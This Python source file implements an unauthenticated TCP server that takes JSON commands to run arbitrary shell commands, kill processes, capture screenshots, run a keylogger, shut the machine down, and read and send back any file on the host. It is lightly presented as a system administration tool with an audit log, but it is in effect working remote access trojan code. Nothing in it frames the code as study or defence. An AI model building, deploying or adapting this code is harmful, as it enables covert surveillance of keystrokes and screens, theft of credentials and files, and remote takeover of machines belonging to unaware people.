import socket
import psutil
import os
import subprocess
import pyautogui
import time
from pynput.keyboard import Listener
import threading
import json
import base64
from io import BytesIO
import logging

# Configure logging
logging.basicConfig(filename='server_audit.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Server configuration
HOST = '0.0.0.0'
PORT = 5000
BUFFER_SIZE = 4096

# Keylogger data
keystrokes = []
keylog_active = False

def log_action(action):
    """Log client-server interactions."""
    logging.info(action)

def get_process_list():
    """List all running processes."""
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        processes.append({'pid': proc.info['pid'], 'name': proc.info['name']})
    return processes

def start_process(process_name):
    """Start a process by name or path."""
    try:
        subprocess.Popen(process_name, shell=True)
        return f"Started process: {process_name}"
    except Exception as e:
        return f"Error starting process: {str(e)}"

def terminate_process(pid):
    """Terminate a process by PID."""
    try:
        proc = psutil.Process(pid)
        proc.terminate()
        return f"Terminated process with PID: {pid}"
    except Exception as e:
        return f"Error terminating process: {str(e)}"

def get_application_list():
    """List running applications (simplified to processes with a UI)."""
    apps = []
    for proc in psutil.process_iter(['pid', 'name']):
        apps.append({'pid': proc.info['pid'], 'name': proc.info['name']})
    return apps

def start_application(app_name):
    """Start an application."""
    return start_process(app_name)

def terminate_application(pid):
    """Terminate an application by PID."""
    return terminate_process(pid)

def capture_screenshot():
    """Capture and encode screenshot."""
    screenshot = pyautogui.screenshot()
    buffer = BytesIO()
    screenshot.save(buffer, format='PNG')
    encoded = base64.b64encode(buffer.getvalue()).decode('utf-8')
    return encoded

def on_key_press(key):
    """Log keystrokes."""
    global keystrokes, keylog_active
    if keylog_active:
        try:
            keystrokes.append(str(key))
        except:
            keystrokes.append('[UNRECOGNIZED_KEY]')

def start_keylogger():
    """Start keylogging in a separate thread."""
    global keylog_active
    keylog_active = True
    def listen_keys():
        with Listener(on_press=on_key_press) as listener:
            listener.join()
    threading.Thread(target=listen_keys, daemon=True).start()
    return "Keylogger started"

def stop_keylogger():
    """Stop keylogging and return logged keystrokes."""
    global keylog_active, keystrokes
    keylog_active = False
    result = ''.join(keystrokes)
    keystrokes = []
    return result if result else "No keystrokes captured"

def shutdown_system():
    """Shutdown the system."""
    if os.name == 'nt':
        os.system("shutdown /s /t 1")
    else:
        os.system("shutdown now")
    return "System shutting down"

def get_system_resources():
    """Monitor CPU, memory, and disk usage."""
    cpu = psutil.cpu_percent()
    memory = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    return {'cpu': cpu, 'memory': memory, 'disk': disk}

def transfer_file(file_path):
    """Send a file to the client."""
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encoded = base64.b64encode(data).decode('utf-8')
        return encoded
    except Exception as e:
        return f"Error transferring file: {str(e)}"

def handle_client(conn, addr):
    """Handle client connection."""
    log_action(f"New connection from {addr}")
    while True:
        try:
            data = conn.recv(BUFFER_SIZE).decode('utf-8')
            if not data:
                break
            command = json.loads(data)
            action = command.get('action')
            log_action(f"Received command: {action} from {addr}")

            response = {}
            if action == 'list_processes':
                response = get_process_list()
            elif action == 'start_process':
                response = start_process(command.get('process_name'))
            elif action == 'terminate_process':
                response = terminate_process(int(command.get('pid')))
            elif action == 'list_applications':
                response = get_application_list()
            elif action == 'start_application':
                response = start_application(command.get('app_name'))
            elif action == 'terminate_application':
                response = terminate_application(int(command.get('pid')))
            elif action == 'capture_screenshot':
                response = capture_screenshot()
            elif action == 'start_keylogger':
                response = start_keylogger()
            elif action == 'stop_keylogger':
                response = stop_keylogger()
            elif action == 'shutdown':
                response = shutdown_system()
            elif action == 'system_resources':
                response = get_system_resources()
            elif action == 'transfer_file':
                response = transfer_file(command.get('file_path'))
            else:
                response = "Unknown command"

            conn.send(json.dumps(response).encode('utf-8'))
        except Exception as e:
            log_action(f"Error handling client {addr}: {str(e)}")
            break
    conn.close()
    log_action(f"Connection closed for {addr}")

def start_server():
    """Start the server."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"Server listening on {HOST}:{PORT}")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    start_server()